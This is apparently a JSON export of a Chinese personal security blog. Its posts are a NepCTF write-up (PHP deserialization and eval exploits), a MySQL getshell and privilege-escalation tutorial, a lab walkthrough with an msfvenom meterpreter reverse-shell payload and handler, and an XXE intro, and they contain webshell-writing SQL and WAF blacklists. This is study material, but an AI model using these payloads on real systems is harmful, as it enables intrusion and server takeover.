{"meta":{"title":"Pp1ove","subtitle":null,"description":null,"author":"Pp1ove","url":"https://pp1ove.gitee.io"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-01-01T13:06:03.809Z","comments":false,"path":"about/index.html","permalink":"https://pp1ove.gitee.io/about/index.html","excerpt":"","text":"[さくら荘のPp1ove] 与&nbsp; Pp1ove&nbsp; （ 真（ま）白（しろ） ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pp1ove.gitee.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pp1ove.gitee.io/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pp1ove.gitee.io/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pp1ove.gitee.io/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pp1ove.gitee.io/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pp1ove.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pp1ove.gitee.io/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-01-14T03:38:55.581Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pp1ove.gitee.io/theme-sakura/index.html","excerpt":"","text":"","keywords":"Hexo 主题 Sakura 🌸"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-01-01T14:55:48.877Z","comments":false,"path":"music/index.html","permalink":"https://pp1ove.gitee.io/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pp1ove.gitee.io/rss/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pp1ove.gitee.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"}],"posts":[{"title":"Nepctf","slug":"Nepctf","date":"2021-03-22T12:09:44.000Z","updated":"2021-03-26T09:58:24.492Z","comments":true,"path":"2021/03/22/Nepctf/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/22/Nepctf/","excerpt":"","text":"昵称:Pp1ove 比赛名次:151 分数 97 little_trick&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&#39;nep&#39;]; $len = $_GET[&#39;len&#39;]; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die(&#39;too long!&#39;); } ?&gt; 截取了$nep的长度,可以使用$nep=`$nep`;XXX $len=7 这样截取后就会变成 eval(&quot;`$nep`;&quot;); $nep被解析,最终执行eval(``$nep`;XXX`); 然后我们可以随意修改XXX的值来执行命令, 但是这题对长度有限制,strlen($nep)&lt;13 我们控制的XXX的长度就应该&lt;5 执行命令ls&gt;a ,可以将ls的输出输入到a文件里面 访问a文件,发现目录下有一个nepctf.php文件, 再用xz *命令进行打包,*会列出当前目录下的所有文件,下载nepctf.php.xz获得flag 梦里花开牡丹亭&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#39;shell.php&#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username=&#39;user&#39;; $this-&gt;password=&#39;user&#39;; } public function __wakeup(){ if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#39;login success you can to open shell file!&#39;); } } } class register{ public function checking($username,$password) { if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){ die(&#39;success register admin&#39;); }else{ die(&#39;please register admin &#39;); } } } class Open{ function open($filename, $content){ if(!file_get_contents(&#39;waf.txt&#39;)){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } } } if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))){ @unserialize(base64_decode($_POST[&#39;unser&#39;])); } 简单的反序列化。。。。大概吧,一开始的pop链挺好构造的, class Game { public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username = &#39;admin&#39;; $this-&gt;password = &#39;admin&#39;; $this-&gt;register = &#39;admin&#39;; $this-&gt;file = new Open(); $this-&gt;filename = &#39;shell&#39;; $this-&gt;content = &#39;&#39;; } public function __wakeup() { if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) { $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password); } } class login { } class register { } class Open { } $a = new Game(); var_dump($a); echo base64_encode(serialize($a)); 可以查看源代码读到shell.php文件,读php文件要看源代码!!!又给忘了,导致这里卡了半天没反应过来 #shell.php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#39;,$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die(&#39;so long!&#39;); } } 接下来就需要进入 class Open{ function open($filename, $content){ if(!file_get_contents(&#39;waf.txt&#39;)){ echo $content; shell($content); } } 但是waf.txt文件时存在的呀,而且参数不可控制,直接把人给打昏了,然后又尝试了下file_get_contents配合伪协议,发现也不行,好叭,倒回去看一下前面是否有利用点,还有个file参数,尝试一下利用,这里利用php的内置类 ,找一下又没有内置类里面有open方法 &lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array(&#39;open&#39;))) { print $class . &#39;::&#39; . $method . &quot;\\n&quot;; } } } #找到了三个 SessionHandler::open ZipArchive::open XMLReader::open 去翻了一下官方文档,发现ZipArchive::open可以进行文件的overwrite, 直接构造 file=new ZipArchive(); $this-&gt;filename = &#39;waf.txt&#39;; $this-&gt;content = 8; //echo了一下,ZipArchive::OVERWRITE=8 成功删除了waf.txt (这里之前我content没有设置为8,设置的1,可能因为没有关闭文件的原因,后面payload一直打不通,删除不了文件,重启了一下环境就好了) 接下来就差最后一步了,执行命令 ls / #发现根目录下的flag文件 /flag&amp;&gt;q #发现q文件创起了,但是里面没有内容,本地测试了一下,发现格式为flag={xxx}确实不会报错,自己也还没搞清楚报错的原因 重新回到执行命令的思路上,对长度进行了限制,后面 空格/flag应该是固定的,就看前面的命令最多只有三个字符,n\\l不就是三个字符吗? 用$content=&#39;n\\l /flag&#39;成功读取flag 最后附上exp &lt;?php class Game { public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username = &#39;admin&#39;; $this-&gt;password = &#39;admin&#39;; $this-&gt;register = &#39;admin&#39;; $this-&gt;file = new Open(); $this-&gt;filename = &#39;&#39;; $this-&gt;content = &#39;n\\l /flag&#39;; } public function __wakeup() { if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) { $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password); } } class login { } class register { } class Open { } $a = new Game(); var_dump($a); echo base64_encode(serialize($a)); 复现bbxhh前面按着做就行了,因为封了ip需要不停换节点,然后主要弄下最后关键的代码(因为原题要不停换节点,就懒得弄了,直接把代码放到本地测试了) &lt;?php function waf($s) { return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s); } if (isset($_GET[&#39;a&#39;])) { $_ = waf($_GET[&#39;a&#39;]); $__ = waf($_GET[&#39;b&#39;]); $a = new $_($__); } else { $a = new Error(&#39;?&#39;); } if (isset($_GET[&#39;c&#39;]) &amp;&amp; isset($_GET[&#39;d&#39;])) { $c = waf($_GET[&#39;c&#39;]); $d = waf($_GET[&#39;d&#39;]); eval(&quot;\\$a-&gt;$c($d);&quot;); } else { $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;); } 看wp说的需要用到反射类,那就去学学 https://learnku.com/articles/7538/the-application-of-reflection-in-php https://www.php.net/manual/zh/reflectionfunction.invokeargs.php exp: &lt;?php function waf($s){ return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s); } $a=&#39;ReflectionFunction&#39;; $b=&#39;assert&#39;; $c=&#39;invokeArgs&#39;; $d=&quot;array(&#39;show_source(\\&quot;XXX.php\\&quot;);&#39;)&quot;; if(isset($a)) { $_ = waf($a); $__ = waf($b); $a = new $_($__); } else { $a = new Error(&#39;?&#39;); } if(isset($c) &amp;&amp; isset($d)) { $c = waf($c); $d = waf($d); eval(&quot;\\$a-&gt;$c($d);&quot;); } else { $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;); } 然后遇到了一个大坑,就是我直接F10运行会疯狂报错,结果我在浏览器上查看的时候又没有问题。是因为我本地的php环境为7.3,而assert函数被舍弃了一些功能 PHP &gt;= 5.4.8，description 可作为第四个参数提供给 ASSERT_CALLBACK 模式里的回调函数 在 PHP 5 中，参数 assertion 必须是可执行的字符串，或者运行结果为布尔值的表达式 在 PHP 7 中，参数 assertion 可以是任意表达式，并用其运算结果作为断言的依据 在 PHP 7 中，参数 exception 可以是个 Throwable 对象，用于捕获表达式运行错误或断言结果为失败。(当然 assert.exception 需开启) PHP &gt;= 7.0.0，支持 zend.assertions、assert.exception 相关配置及其特性 PHP &gt;= 7.2 版本开始，参数 assertion 不再支持字符串 还有另一种解法 $c=&#39;getMessage&#39;; $d=&quot;eval(&#39;system(\\&quot;dir\\&quot;);&#39;)&quot;; 这里$a=new Error(‘?’); 然后$c为$a下任意一个方法,当执行时,会先执行eval(‘system(\\‘dir\\‘);’); system会自动回显输出,然后再将system();的返回值传给getMessage方法,然后报错,但是system已经执行了,所以说后面报不报错已经无所谓了。 gamejs访问source获得源码 var opn = require(&#39;opn&#39;); var express = require(&#39;express&#39;); var app = express(); var path = require(&#39;path&#39;); var bodyParser = require(&#39;body-parser&#39;); var highestScore = 40000; var FUNCFLAG = &#39;_$$ND_FUNC$$_&#39;; var serialize_banner = &#39;{&quot;banner&quot;:&quot;好，很有精神！&quot;}&#39;; var flag = {&quot;flag&quot;:&quot;&quot;} // flag是啥来着？记不清了。 function Record() { this.lastScore = 0; this.maxScore = 0; this.lastTime = null; } var validCode = function (func_code){ let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|&#39;|\\[|\\+|\\*/ig; return !validInput.test(func_code); }; var validInput = function (input) { let validInput = /subprocess|mainModule|from|process|child_process|main|require|exec|this|function|buffer/ig; ins = serialize(input); return !validInput.test(ins); }; var merge = function (target, source) { try { for (let key in source) { if (typeof source[key] == &#39;object&#39;) { merge(target[key], source[key]); } else { target[key] = source[key]; } } } catch (e) { console.log(e); } }; var serialize = function (obj, ignoreNativeFunc, outputObj, cache, path) { path = path || &#39;$&#39;; cache = cache || {}; cache[path] = obj; outputObj = outputObj || {}; if (typeof obj === &#39;string&#39;) { return JSON.stringify(obj); } var key; for (key in obj) { if (obj.hasOwnProperty(key)) { if (typeof obj[key] === &#39;function&#39;) { var funcStr = obj[key].toString(); outputObj[key] = FUNCFLAG + funcStr; } else { outputObj[key] = obj[key]; } } } return JSON.stringify(outputObj); }; var unserialize = function(obj) { obj = JSON.parse(obj); if (typeof obj === &#39;string&#39;) { return obj; } var key; for(key in obj) { if(typeof obj[key] === &#39;string&#39;) { if(obj[key].indexOf(FUNCFLAG) === 0) { var func_code=obj[key].substring(FUNCFLAG.length); if (validCode(func_code)){ var d = &#39;(&#39; + func_code + &#39;)&#39;; obj[key] = eval(d); } } } } return obj; }; app.use(bodyParser()); app.use(bodyParser.json()); app.use(express.static(path.join(__dirname, &#39;views&#39;))); app.use(function (req, res, next) { if (validInput(req.body)) { next(); } else { res.status(403).send(&#39;Hacker!!!&#39;); } }); async function index(req, res) { res.sendFile(path.resolve(__dirname, &#39;static/index.html&#39;)); } async function record(req, res, next) { new Promise(function (resolve, reject) { var record = new Record(); var score = req.body.score; if (score.length &lt; String(highestScore).length) { merge(record, { lastScore: score, maxScore: Math.max(parseInt(score),record.maxScore), lastTime: new Date().toString() }); highestScore = highestScore &gt; parseInt(score) ? highestScore : parseInt(score); if ((score - highestScore) &lt; 0) { var banner = &quot;不好，没有精神！&quot;; } else { var banner = unserialize(serialize_banner).banner; } } res.json({ banner: banner, record: record }); }).catch(function (err) { next(err) }) } app.post(&#39;/record&#39;, record); app.get(&#39;/&#39;, index); app.get(&#39;/source&#39;, function (req, res) { opn(&#39;app.js&#39;).then(() =&gt; { res.sendFile(path.join(__dirname, &#39;app.js&#39;)); }); }) app.use(function (err, req, res, next) { console.log(err.stack); res.status(500).send(&#39;Some thing broke!&#39;) }); app.listen(&#39;3000&#39;);","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"mysql提权","slug":"mysql提权","date":"2021-03-07T09:36:46.000Z","updated":"2021-03-07T12:37:17.598Z","comments":true,"path":"2021/03/07/mysql提权/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/07/mysql提权/","excerpt":"","text":"实验环境 攻击机: kali2020 192.168.182.137 靶机：win7 192.168.182.128 权限获取账号密码登录远程连接 可以通过暴力破解,或者知道用户名密码,但是这里没有连上,因为默认情况下mysql账号是不允许远程登录的, 客户端登录通过phpMyadmin登录,即使没有开启远程登录也可以使用phpMyadmin登录 密码获取1.暴力破解 2.读取网站配置文件拿到数据库账号密码 关键字：config conn data sql inc database等 3.Hash获取 MySQL &lt;= 5.6 版本select host, user, password from mysql.user; MySQL &gt;= 5.7 版本select host,user,authentication_string from mysql.user; 查看密码文件,User.MYD文件一般在mysql数据库文件夹下:https://www.cnblogs.com/hack404/p/10790529.html 存在注入若网站存在sql注入，则可以通过sqlmap的--sql-shell参数来获得数据库操作权限 sqlmap -u &quot;192.168.182.128/sqli-labs/Less-1/?id=1&quot; --sql-shell mysql漏洞CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 getshell一般都是利用sql权限来提升到www-data权限 这里分享一篇文章,是根据mysql注入点提权的 https://www.cnblogs.com/zzjdbk/p/12992288.html 注入:直接通过写入文件来getshell，需要满足以下条件 知道网站绝对路径 没有运行在 secure-file-priv 模式下 对 Web 目录有读写权限 高权限数据库用户 在mysql5.7的版本下,secure-file-priv默认为NULL,不允许导入和导出 获取绝对路径的方法 1.phpinfo() 2.出错页面 3.load_file读取网站配置文件 如index.php /etc/passwd 4.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径 5.进入后台 6.百度出错信息 zoomeye shadon 搜索error warning 7. @@datadir参数看mysql路径 反猜绝对路径 这部分懒得写了,就直接copy cyzcc师傅的了 into oufile 写 shell直接通过写入文件来getshell，需要满足以下条件 知道网站绝对路径 没有运行在 secure-file-priv 模式下 对 Web 目录有读写权限 高权限数据库用户 获取绝对路径的方法 1.phpinfo() 2.出错页面 3.load_file读取网站配置文件 如index.php /etc/passwd 4.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径 5.进入后台 6.百度出错信息 zoomeye shadon 搜索error warning 7. @@datadir参数看mysql路径 反猜绝对路径 还可以查询select @@datadir参数得到mysql路径从而猜测得到网站路径 这里一般猜测网站路径为 C:\\phpStudy\\PHPTutorial\\wwwC:\\phpStudy\\PHPTutorial\\WWWC:\\phpStudy\\PHPTutorial\\htmlC:\\phpStudy\\PHPTutorial\\wwwroot………. 查看mysql安全设置 show global variables like &#39;%secure_file_priv%&#39;; secure_file_priv 可以设置三个参数：空，NULL，filepath 参数说明： 空值：设置为空时，没有进行安全配置，那么这模式下应该就可以导出 webshell NULL：设置本参数值时，数据库不能进行导入导出 filepath：filepath 是导入导出的文件路径，设置这个值，那么只能导出文件到 filepath 的路径。 这里需要满足 secure_file_priv 为空或者为 web 路径才可以进行读写操作，如果不为空可在 mysql.ini 配置文件中加上 secure_file_priv = 即可 满足以上条件便可使用sql语句来写shell 直接在漏洞点使用联合查询写入： ?id=1&#39; union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;C:/phpStudy/PHPTutorial/WWW/cyz.php&#39;--+ 使用sqlmap写shellsqlmap -u &quot;http://192.168.43.130/sqli-labs/Less-1/?id=1&quot; --file-write=&quot;cyz.php&quot; --file-dest=&quot;C:/phpStudy/PHPTutorial/WWW/sqlmap_cyz.php&quot;cyz.php为本地文件 使用sqlmap的--os-shell写入shell phpmyadmin使用日志写入shell使用账号密码登录后，除了使用上面的SQL语句来写入shell外，还可以使用其他方法来getshell如phpmyadmin中的文件包含漏洞、命令执行漏洞等来getshell 使用 log 写入 Shell 满足条件： 数据库为 root 权限 Web 目录可写 知道 Web 的物理绝对路径 首先开启 mysql 的日志记录模式 首先查看一下日志的配置： show variables like &#39;%general%&#39;; 打开日志记录 set global general_log=&#39;on&#39;; 然后改变日志的路径 set global general_log_file=&#39;C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\mysql_shell.php&#39;; 之后随便执行一段php代码然后访问mysql_shell.php即可getshell SELECT &quot;&lt;?php phpinfo();?&gt;&quot;; PHPMyAdmin 包含数据库文件 getshell首先查询数据库文件的存储地址: show global variables like &quot;%datadir%&quot;; 其中的.frm 即为我们的数据库文件 在 mysql_shell 库中新建个 mysql_shell 表，然后字段写上我们的一句话马 可以看到一句话木马已经写入.frm文件 之后使用PHPMyAdmin4.8.x 版本的文件包含漏洞即可进行利用 /index.php?target=db_sql.php%3f/../../../../../../../../../../../../../../C:/phpStudy/PHPTutorial/MySQL/data/test/mysql_shell.frm 由于没有该版本，就没有接着复现了 其他phpmyadmin版本的漏洞 phpmyadmin命令执行漏洞:CVE-2016-5734 PHPMyaAdmin 本地 SESSION 包含 getshell:CVE-2018-12613","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"chili靶机","slug":"chili靶机","date":"2021-03-06T14:11:04.000Z","updated":"2021-03-07T03:39:27.803Z","comments":true,"path":"2021/03/06/chili靶机/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/06/chili靶机/","excerpt":"","text":"信息搜集主机发现 漏洞发现与利用扫一下80端口目录没扫出来东西,目标锁向21端口,cewl工具跑一下关键词,获取到可能存在的用户名 暴力破解 用户名: chili 密码: a1b2c3d4 登录ftp ftp 192.168.182.131 发现有777权限的目录 进入后用msf生成shell并上传 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.200.129 LPORT=4444 -f raw &gt; shell.php 别忘了给shell加777权限 浏览器访问shell成功拿到shell 提权use exploit/multi/handler set payload php/meterpreter_reverse_tcp set LHOST 192.168.43.221 set LPORT 2233 run 浏览器访问我们的shell 进入交互模式 在.nano目录中使用wget下载https://github.com/luke-goddard/enumy提权脚本 关于enumy工具:https://www.cnblogs.com/zzjdbk/p/14094663.html","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"初探xxe","slug":"初探xxe","date":"2021-03-03T13:50:24.000Z","updated":"2021-03-04T11:15:23.887Z","comments":true,"path":"2021/03/03/初探xxe/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/03/初探xxe/","excerpt":"","text":"参考链接:https://xz.aliyun.com/t/3357#toc-0 环境配置因为xxe的利用条件比较苛刻,自己搭环境很有可能会出问题。这里就使用vulhub上的靶机来进行实验 vulhub搭建: https://vulhub.org/#/docs/install-docker-one-click/ 下载链接: https://codeload.github.com/vulhub/vulhub/zip/master 具体搭建流程: https://www.77169.net/html/264526.html xxe漏洞的产生与php版本无关,主要是libxml的拓展。2.9以后默认不使用外部实体,导致xxe几乎灭绝 libxml_disable_entity_loader(false); //如果为true,则无法导入外部实体,防御一半也是这样防御的 simplexml_load_string($xml, ，SimpleXMLElement’, LIBXML_NOENT); 